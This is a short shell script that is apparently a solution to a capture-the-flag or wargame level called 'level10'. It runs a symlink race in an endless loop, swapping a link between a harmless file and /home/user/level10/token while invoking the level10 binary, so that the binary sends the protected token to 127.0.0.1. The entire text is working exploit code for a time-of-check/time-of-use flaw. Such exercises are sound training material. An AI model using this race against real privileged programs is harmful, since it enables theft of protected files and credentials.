touch x
    while true; do
        ln -sf ./x fake & 
        ~/level10 fake 127.0.0.1 & 
        ln -sf /home/user/level10/token fake &
    done